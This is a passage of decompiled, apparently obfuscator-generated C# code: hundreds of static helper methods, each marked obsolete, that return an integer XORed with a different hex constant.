		return int_4 ^ 0x6721E463;
	}

	[Obsolete("Exclude")]
	public static int smethod_4397(int int_4)
	{
		return int_4 ^ 0x6F04B121;
	}

	[Obsolete("Exclude")]
	public static int smethod_4398(int int_4)
	{
		return int_4 ^ 0x2C12466D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4399(int int_4)
	{
		return int_4 ^ 0x5CE8DA77;
	}

	[Obsolete("Exclude")]
	public static int smethod_4400(int int_4)
	{
		return int_4 ^ 0x7807C4FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4401(int int_4)
	{
		return int_4 ^ 0x263C22B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4402(int int_4)
	{
		return int_4 ^ 0x2C92D598;
	}

	[Obsolete("Exclude")]
	public static int smethod_4403(int int_4)
	{
		return int_4 ^ 0x58856361;
	}

	[Obsolete("Exclude")]
	public static int smethod_4404(int int_4)
	{
		return int_4 ^ 0x425DB781;
	}

	[Obsolete("Exclude")]
	public static int smethod_4405(int int_4)
	{
		return int_4 ^ 0x467D8D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4406(int int_4)
	{
		return int_4 ^ 0x756D794A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4407(int int_4)
	{
		return int_4 ^ 0x293BC84C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4408(int int_4)
	{
		return int_4 ^ 0x11E691CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4409(int int_4)
	{
		return int_4 ^ 0x3AD985AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4410(int int_4)
	{
		return int_4 ^ 0x780E46A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4411(int int_4)
	{
		return int_4 ^ 0x1967D604;
	}

	[Obsolete("Exclude")]
	public static int smethod_4412(int int_4)
	{
		return int_4 ^ 0x32071E22;
	}

	[Obsolete("Exclude")]
	public static int smethod_4413(int int_4)
	{
		return int_4 ^ 0x22D98275;
	}

	[Obsolete("Exclude")]
	public static int smethod_4414(int int_4)
	{
		return int_4 ^ 0x6377D4F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4415(int int_4)
	{
		return int_4 ^ 0x15F082F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4416(int int_4)
	{
		return int_4 ^ 0x638D96EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4417(int int_4)
	{
		return int_4 ^ 0x540B3277;
	}

	[Obsolete("Exclude")]
	public static int smethod_4418(int int_4)
	{
		return int_4 ^ 0x359356DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4419(int int_4)
	{
		return int_4 ^ 0x2FCE4553;
	}

	[Obsolete("Exclude")]
	public static int smethod_4420(int int_4)
	{
		return int_4 ^ 0x756CE678;
	}

	[Obsolete("Exclude")]
	public static int smethod_4421(int int_4)
	{
		return int_4 ^ 0x77BDCD09;
	}

	[Obsolete("Exclude")]
	public static int smethod_4422(int int_4)
	{
		return int_4 ^ 0x2A5845FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4423(int int_4)
	{
		return int_4 ^ 0x6BE9C277;
	}

	[Obsolete("Exclude")]
	public static int smethod_4424(int int_4)
	{
		return int_4 ^ 0x17DBBA73;
	}

	[Obsolete("Exclude")]
	public static int smethod_4425(int int_4)
	{
		return int_4 ^ 0x6D343A53;
	}

	[Obsolete("Exclude")]
	public static int smethod_4426(int int_4)
	{
		return int_4 ^ 0x60E9F0AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4427(int int_4)
	{
		return int_4 ^ 0x4B8F9BD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4428(int int_4)
	{
		return int_4 ^ 0x7444FA1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4429(int int_4)
	{
		return int_4 ^ 0x7B484BD8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4430(int int_4)
	{
		return int_4 ^ 0x5B6A2E7B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4431(int int_4)
	{
		return int_4 ^ 0x72D208DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4432(int int_4)
	{
		return int_4 ^ 0x19619A1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4433(int int_4)
	{
		return int_4 ^ 0x7E599FCB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4434(int int_4)
	{
		return int_4 ^ 0x2B42896C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4435(int int_4)
	{
		return int_4 ^ 0x706F571C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4436(int int_4)
	{
		return int_4 ^ 0x7175BB3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4437(int int_4)
	{
		return int_4 ^ 0x4F83D7BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4438(int int_4)
	{
		return int_4 ^ 0x2535336A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4439(int int_4)
	{
		return int_4 ^ 0x3078594B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4440(int int_4)
	{
		return int_4 ^ 0x71F9C1BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4441(int int_4)
	{
		return int_4 ^ 0x38F0FD3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4442(int int_4)
	{
		return int_4 ^ 0x59084DB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4443(int int_4)
	{
		return int_4 ^ 0x66CDF968;
	}

	[Obsolete("Exclude")]
	public static int smethod_4444(int int_4)
	{
		return int_4 ^ 0x1951654C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4445(int int_4)
	{
		return int_4 ^ 0x7120C203;
	}

	[Obsolete("Exclude")]
	public static int smethod_4446(int int_4)
	{
		return int_4 ^ 0x4918F0CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4447(int int_4)
	{
		return int_4 ^ 0x1A78D226;
	}

	[Obsolete("Exclude")]
	public static int smethod_4448(int int_4)
	{
		return int_4 ^ 0x3E6FC31C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4449(int int_4)
	{
		return int_4 ^ 0x289F3B1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4450(int int_4)
	{
		return int_4 ^ 0x7FA823A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4451(int int_4)
	{
		return int_4 ^ 0x195D87A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4452(int int_4)
	{
		return int_4 ^ 0x788B674E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4453(int int_4)
	{
		return int_4 ^ 0x42E81A2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4454(int int_4)
	{
		return int_4 ^ 0x1696A2CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4455(int int_4)
	{
		return int_4 ^ 0x35B3E547;
	}

	[Obsolete("Exclude")]
	public static int smethod_4456(int int_4)
	{
		return int_4 ^ 0x512FFE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4457(int int_4)
	{
		return int_4 ^ 0x4E828DF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4458(int int_4)
	{
		return int_4 ^ 0xF92A294;
	}

	[Obsolete("Exclude")]
	public static int smethod_4459(int int_4)
	{
		return int_4 ^ 0x33BA9820;
	}

	[Obsolete("Exclude")]
	public static int smethod_4460(int int_4)
	{
		return int_4 ^ 0x78D3D170;
	}

	[Obsolete("Exclude")]
	public static int smethod_4461(int int_4)
	{
		return int_4 ^ 0x17DE1DAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4462(int int_4)
	{
		return int_4 ^ 0x63DBA307;
	}

	[Obsolete("Exclude")]
	public static int smethod_4463(int int_4)
	{
		return int_4 ^ 0x30A839AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4464(int int_4)
	{
		return int_4 ^ 0xF41B024;
	}

	[Obsolete("Exclude")]
	public static int smethod_4465(int int_4)
	{
		return int_4 ^ 0xDDCB3FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4466(int int_4)
	{
		return int_4 ^ 0x339BBFD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4467(int int_4)
	{
		return int_4 ^ 0x5A2986E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4468(int int_4)
	{
		return int_4 ^ 0x7453A588;
	}

	[Obsolete("Exclude")]
	public static int smethod_4469(int int_4)
	{
		return int_4 ^ 0x331A0AA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4470(int int_4)
	{
		return int_4 ^ 0xC66C98E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4471(int int_4)
	{
		return int_4 ^ 0x213188C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4472(int int_4)
	{
		return int_4 ^ 0xD6B0094;
	}

	[Obsolete("Exclude")]
	public static int smethod_4473(int int_4)
	{
		return int_4 ^ 0xB0C8A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4474(int int_4)
	{
		return int_4 ^ 0x64378490;
	}

	[Obsolete("Exclude")]
	public static int smethod_4475(int int_4)
	{
		return int_4 ^ 0x59604888;
	}

	[Obsolete("Exclude")]
	public static int smethod_4476(int int_4)
	{
		return int_4 ^ 0x4A87C2B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4477(int int_4)
	{
		return int_4 ^ 0x4E777249;
	}

	[Obsolete("Exclude")]
	public static int smethod_4478(int int_4)
	{
		return int_4 ^ 0x32C76D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4479(int int_4)
	{
		return int_4 ^ 0x38099070;
	}

	[Obsolete("Exclude")]
	public static int smethod_4480(int int_4)
	{
		return int_4 ^ 0x27BBDF3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4481(int int_4)
	{
		return int_4 ^ 0x608D33DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4482(int int_4)
	{
		return int_4 ^ 0x30E941C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4483(int int_4)
	{
		return int_4 ^ 0x2FB5EB53;
	}

	[Obsolete("Exclude")]
	public static int smethod_4484(int int_4)
	{
		return int_4 ^ 0x6A7CEEE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4485(int int_4)
	{
		return int_4 ^ 0x44A262AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4486(int int_4)
	{
		return int_4 ^ 0x197A880A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4487(int int_4)
	{
		return int_4 ^ 0x501A9B5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4488(int int_4)
	{
		return int_4 ^ 0x3A08B4F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4489(int int_4)
	{
		return int_4 ^ 0xE6D8C46;
	}

	[Obsolete("Exclude")]
	public static int smethod_4490(int int_4)
	{
		return int_4 ^ 0x64238113;
	}

	[Obsolete("Exclude")]
	public static int smethod_4491(int int_4)
	{
		return int_4 ^ 0x48ADC89B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4492(int int_4)
	{
		return int_4 ^ 0x454D3F2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4493(int int_4)
	{
		return int_4 ^ 0x562F5CBC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4494(int int_4)
	{
		return int_4 ^ 0x6D8BDEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4495(int int_4)
	{
		return int_4 ^ 0x186E2F45;
	}

	[Obsolete("Exclude")]
	public static int smethod_4496(int int_4)
	{
		return int_4 ^ 0x2606F93D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4497(int int_4)
	{
		return int_4 ^ 0x4FD64880;
	}

	[Obsolete("Exclude")]
	public static int smethod_4498(int int_4)
	{
		return int_4 ^ 0x2F9F45B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4499(int int_4)
	{
		return int_4 ^ 0x35AE5640;
	}

	[Obsolete("Exclude")]
	public static int smethod_4500(int int_4)
	{
		return int_4 ^ 0x14ED1DE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4501(int int_4)
	{
		return int_4 ^ 0x11DD2BE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4502(int int_4)
	{
		return int_4 ^ 0x244F4114;
	}

	[Obsolete("Exclude")]
	public static int smethod_4503(int int_4)
	{
		return int_4 ^ 0x2858FC06;
	}

	[Obsolete("Exclude")]
	public static int smethod_4504(int int_4)
	{
		return int_4 ^ 0x3F2C1FD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4505(int int_4)
	{
		return int_4 ^ 0x1DA1C7CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4506(int int_4)
	{
		return int_4 ^ 0x294AFE4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4507(int int_4)
	{
		return int_4 ^ 0x6EA981CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4508(int int_4)
	{
		return int_4 ^ 0x758E2F24;
	}

	[Obsolete("Exclude")]
	public static int smethod_4509(int int_4)
	{
		return int_4 ^ 0x6B0592A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4510(int int_4)
	{
		return int_4 ^ 0x899F192;
	}

	[Obsolete("Exclude")]
	public static int smethod_4511(int int_4)
	{
		return int_4 ^ 0x79F34B54;
	}

	[Obsolete("Exclude")]
	public static int smethod_4512(int int_4)
	{
		return int_4 ^ 0x6409CCCB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4513(int int_4)
	{
		return int_4 ^ 0x76D616FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4514(int int_4)
	{
		return int_4 ^ 0x13FCC3F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4515(int int_4)
	{
		return int_4 ^ 0x4CD95FF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4516(int int_4)
	{
		return int_4 ^ 0x5F877809;
	}

	[Obsolete("Exclude")]
	public static int smethod_4517(int int_4)
	{
		return int_4 ^ 0x58D307DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4518(int int_4)
	{
		return int_4 ^ 0x4D235620;
	}

	[Obsolete("Exclude")]
	public static int smethod_4519(int int_4)
	{
		return int_4 ^ 0x427AB5F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4520(int int_4)
	{
		return int_4 ^ 0x50CE6678;
	}

	[Obsolete("Exclude")]
	public static int smethod_4521(int int_4)
	{
		return int_4 ^ 0x65ACA9FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4522(int int_4)
	{
		return int_4 ^ 0x3B7C68AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4524(int int_4)
	{
		return int_4 ^ 0x7E1CD3A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4525(int int_4)
	{
		return int_4 ^ 0x5F9D3246;
	}

	[Obsolete("Exclude")]
	public static int smethod_4526(int int_4)
	{
		return int_4 ^ 0x887A6B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4527(int int_4)
	{
		return int_4 ^ 0x2944F209;
	}

	[Obsolete("Exclude")]
	public static int smethod_4528(int int_4)
	{
		return int_4 ^ 0x76BAB1FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4529(int int_4)
	{
		return int_4 ^ 0xC335004;
	}

	[Obsolete("Exclude")]
	public static int smethod_4530(int int_4)
	{
		return int_4 ^ 0x44B8CB2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4531(int int_4)
	{
		return int_4 ^ 0x1F372114;
	}

	[Obsolete("Exclude")]
	public static int smethod_4532(int int_4)
	{
		return int_4 ^ 0x2E44E96C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4533(int int_4)
	{
		return int_4 ^ 0x185A7A70;
	}

	[Obsolete("Exclude")]
	public static int smethod_4534(int int_4)
	{
		return int_4 ^ 0x3BE7AE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4535(int int_4)
	{
		return int_4 ^ 0x26659750;
	}

	[Obsolete("Exclude")]
	public static int smethod_4536(int int_4)
	{
		return int_4 ^ 0x6676B356;
	}

	[Obsolete("Exclude")]
	public static int smethod_4537(int int_4)
	{
		return int_4 ^ 0x647D93CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4538(int int_4)
	{
		return int_4 ^ 0x45538E4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4539(int int_4)
	{
		return int_4 ^ 0x32F0C8C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4540(int int_4)
	{
		return int_4 ^ 0x535C9565;
	}

	[Obsolete("Exclude")]
	public static int smethod_4541(int int_4)
	{
		return int_4 ^ 0x75161F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4542(int int_4)
	{
		return int_4 ^ 0x74E06C96;
	}

	[Obsolete("Exclude")]
	public static int smethod_4543(int int_4)
	{
		return int_4 ^ 0x683A8D1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4544(int int_4)
	{
		return int_4 ^ 0x34461363;
	}

	[Obsolete("Exclude")]
	public static int smethod_4545(int int_4)
	{
		return int_4 ^ 0x7BD10BB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4546(int int_4)
	{
		return int_4 ^ 0x52344E18;
	}

	[Obsolete("Exclude")]
	public static int smethod_4547(int int_4)
	{
		return int_4 ^ 0x70828506;
	}

	[Obsolete("Exclude")]
	public static int smethod_4548(int int_4)
	{
		return int_4 ^ 0x67559F3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4549(int int_4)
	{
		return int_4 ^ 0x648466C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4550(int int_4)
	{
		return int_4 ^ 0x1D2D5335;
	}

	[Obsolete("Exclude")]
	public static int smethod_4551(int int_4)
	{
		return int_4 ^ 0x2619AB75;
	}

	[Obsolete("Exclude")]
	public static int smethod_4552(int int_4)
	{
		return int_4 ^ 0x6124D63D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4553(int int_4)
	{
		return int_4 ^ 0x2AD4839A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4554(int int_4)
	{
		return int_4 ^ 0x645EF8D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4556(int int_4)
	{
		return int_4 ^ 0x4976D41E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4557(int int_4)
	{
		return int_4 ^ 0x782CF1A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4558(int int_4)
	{
		return int_4 ^ 0x6FEA5F45;
	}

	[Obsolete("Exclude")]
	public static int smethod_4559(int int_4)
	{
		return int_4 ^ 0xBEBC518;
	}

	[Obsolete("Exclude")]
	public static int smethod_4560(int int_4)
	{
		return int_4 ^ 0x21EE6C12;
	}

	[Obsolete("Exclude")]
	public static int smethod_4561(int int_4)
	{
		return int_4 ^ 0x21E04EEB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4562(int int_4)
	{
		return int_4 ^ 0x16AF5181;
	}

	[Obsolete("Exclude")]
	public static int smethod_4563(int int_4)
	{
		return int_4 ^ 0x6D39B3BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4564(int int_4)
	{
		return int_4 ^ 0x4A8034D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4565(int int_4)
	{
		return int_4 ^ 0x3B19545D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4566(int int_4)
	{
		return int_4 ^ 0x37184DF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4567(int int_4)
	{
		return int_4 ^ 0x18788F30;
	}

	[Obsolete("Exclude")]
	public static int smethod_4568(int int_4)
	{
		return int_4 ^ 0x5344BE74;
	}

	[Obsolete("Exclude")]
	public static int smethod_4569(int int_4)
	{
		return int_4 ^ 0x3F63E5E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4570(int int_4)
	{
		return int_4 ^ 0x2301E838;
	}

	[Obsolete("Exclude")]
	public static int smethod_4571(int int_4)
	{
		return int_4 ^ 0x1D93C6E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4572(int int_4)
	{
		return int_4 ^ 0x47FF59F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4573(int int_4)
	{
		return int_4 ^ 0x62949327;
	}

	[Obsolete("Exclude")]
	public static int smethod_4574(int int_4)
	{
		return int_4 ^ 0x4554958D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4575(int int_4)
	{
		return int_4 ^ 0x5A2ACE3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4576(int int_4)
	{
		return int_4 ^ 0x5FB09B50;
	}

	[Obsolete("Exclude")]
	public static int smethod_4577(int int_4)
	{
		return int_4 ^ 0x615F8183;
	}

	[Obsolete("Exclude")]
	public static int smethod_4578(int int_4)
	{
		return int_4 ^ 0x3238490;
	}

	[Obsolete("Exclude")]
	public static int smethod_4579(int int_4)
	{
		return int_4 ^ 0x1F4D2EDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4580(int int_4)
	{
		return int_4 ^ 0xD71FA61;
	}

	[Obsolete("Exclude")]
	public static int smethod_4581(int int_4)
	{
		return int_4 ^ 0x5944DD52;
	}

	[Obsolete("Exclude")]
	public static int smethod_4582(int int_4)
	{
		return int_4 ^ 0x2010ED2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4583(int int_4)
	{
		return int_4 ^ 0x3D05D84E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4584(int int_4)
	{
		return int_4 ^ 0x230AA339;
	}

	[Obsolete("Exclude")]
	public static int smethod_4585(int int_4)
	{
		return int_4 ^ 0x6AF0586C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4586(int int_4)
	{
		return int_4 ^ 0x63294A8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4587(int int_4)
	{
		return int_4 ^ 0x3102874;
	}

	[Obsolete("Exclude")]
	public static int smethod_4588(int int_4)
	{
		return int_4 ^ 0x4C0A00EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4589(int int_4)
	{
		return int_4 ^ 0xF51162A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4590(int int_4)
	{
		return int_4 ^ 0x678436E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4591(int int_4)
	{
		return int_4 ^ 0x74C1487D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4592(int int_4)
	{
		return int_4 ^ 0x2CB7C36B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4593(int int_4)
	{
		return int_4 ^ 0x37D3217;
	}

	[Obsolete("Exclude")]
	public static int smethod_4594(int int_4)
	{
		return int_4 ^ 0x5A04DC97;
	}

	[Obsolete("Exclude")]
	public static int smethod_4595(int int_4)
	{
		return int_4 ^ 0x71D861B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4596(int int_4)
	{
		return int_4 ^ 0x2CC04BFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4597(int int_4)
	{
		return int_4 ^ 0x1BABDF8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4598(int int_4)
	{
		return int_4 ^ 0x6D48EF9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4599(int int_4)
	{
		return int_4 ^ 0xA534F7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4600(int int_4)
	{
		return int_4 ^ 0x1BF9A6CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4601(int int_4)
	{
		return int_4 ^ 0x49CB088F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4602(int int_4)
	{
		return int_4 ^ 0x3C639875;
	}

	[Obsolete("Exclude")]
	public static int smethod_4603(int int_4)
	{
		return int_4 ^ 0x4589ECBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4604(int int_4)
	{
		return int_4 ^ 0x6D6122B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4605(int int_4)
	{
		return int_4 ^ 0xEC6758B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4606(int int_4)
	{
		return int_4 ^ 0x14B78EBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4607(int int_4)
	{
		return int_4 ^ 0x65C232B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4608(int int_4)
	{
		return int_4 ^ 0x168085CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4609(int int_4)
	{
		return int_4 ^ 0x63A7903;
	}

	[Obsolete("Exclude")]
	public static int smethod_4610(int int_4)
	{
		return int_4 ^ 0x35362CC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4611(int int_4)
	{
		return int_4 ^ 0x282E8599;
	}

	[Obsolete("Exclude")]
	public static int smethod_4612(int int_4)
	{
		return int_4 ^ 0x352920DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4613(int int_4)
	{
		return int_4 ^ 0x52857312;
	}

	[Obsolete("Exclude")]
	public static int smethod_4614(int int_4)
	{
		return int_4 ^ 0x132222B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4615(int int_4)
	{
		return int_4 ^ 0x461ABE2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4616(int int_4)
	{
		return int_4 ^ 0x5F479F80;
	}

	[Obsolete("Exclude")]
	public static int smethod_4617(int int_4)
	{
		return int_4 ^ 0x57CC2028;
	}

	[Obsolete("Exclude")]
	public static int smethod_4618(int int_4)
	{
		return int_4 ^ 0x3E99F3CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4619(int int_4)
	{
		return int_4 ^ 0xECDC405;
	}

	[Obsolete("Exclude")]
	public static int smethod_4620(int int_4)
	{
		return int_4 ^ 0x77A5BF42;
	}

	[Obsolete("Exclude")]
	public static int smethod_4621(int int_4)
	{
		return int_4 ^ 0x68B791CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4622(int int_4)
	{
		return int_4 ^ 0x47B76BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4623(int int_4)
	{
		return int_4 ^ 0x74B80AD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4624(int int_4)
	{
		return int_4 ^ 0x642DE581;
	}

	[Obsolete("Exclude")]
	public static int smethod_4625(int int_4)
	{
		return int_4 ^ 0x4F1DFCE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4626(int int_4)
	{
		return int_4 ^ 0x4FDA8480;
	}

	[Obsolete("Exclude")]
	public static int smethod_4627(int int_4)
	{
		return int_4 ^ 0x6B9291EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4628(int int_4)
	{
		return int_4 ^ 0x1F9F23C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4629(int int_4)
	{
		return int_4 ^ 0x14CC515E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4630(int int_4)
	{
		return int_4 ^ 0x7D82E1A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4631(int int_4)
	{
		return int_4 ^ 0x5C84DF1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4632(int int_4)
	{
		return int_4 ^ 0x116F4EA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4633(int int_4)
	{
		return int_4 ^ 0x5A2A47FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4634(int int_4)
	{
		return int_4 ^ 0x69C416A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4635(int int_4)
	{
		return int_4 ^ 0x6250DD64;
	}

	[Obsolete("Exclude")]
	public static int smethod_4636(int int_4)
	{
		return int_4 ^ 0x1A3134FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4637(int int_4)
	{
		return int_4 ^ 0x4B538DE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4638(int int_4)
	{
		return int_4 ^ 0x18F7CB41;
	}

	[Obsolete("Exclude")]
	public static int smethod_4639(int int_4)
	{
		return int_4 ^ 0x2FF3B0B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4641(int int_4)
	{
		return int_4 ^ 0x2F1CA6A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4642(int int_4)
	{
		return int_4 ^ 0x29348BAE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4643(int int_4)
	{
		return int_4 ^ 0x39EF9ED6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4644(int int_4)
	{
		return int_4 ^ 0x63F7918D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4645(int int_4)
	{
		return int_4 ^ 0x6DF2EC8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4646(int int_4)
	{
		return int_4 ^ 0x7B2DF460;
	}

	[Obsolete("Exclude")]
	public static int smethod_4647(int int_4)
	{
		return int_4 ^ 0x1572A35E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4648(int int_4)
	{
		return int_4 ^ 0x7D0DF5EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4649(int int_4)
	{
		return int_4 ^ 0x5CAE5A55;
	}

	[Obsolete("Exclude")]
	public static int smethod_4650(int int_4)
	{
		return int_4 ^ 0x1B174BE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4651(int int_4)
	{
		return int_4 ^ 0x35791897;
	}

	[Obsolete("Exclude")]
	public static int smethod_4652(int int_4)
	{
		return int_4 ^ 0x694F673F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4653(int int_4)
	{
		return int_4 ^ 0xC5958B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4654(int int_4)
	{
		return int_4 ^ 0x7B9BD274;
	}

	[Obsolete("Exclude")]
	public static int smethod_4655(int int_4)
	{
		return int_4 ^ 0x727CE9EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4656(int int_4)
	{
		return int_4 ^ 0x749E4F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4657(int int_4)
	{
		return int_4 ^ 0x7B4016FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4658(int int_4)
	{
		return int_4 ^ 0x143C0933;
	}

	[Obsolete("Exclude")]
	public static int smethod_4659(int int_4)
	{
		return int_4 ^ 0x83D52F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4660(int int_4)
	{
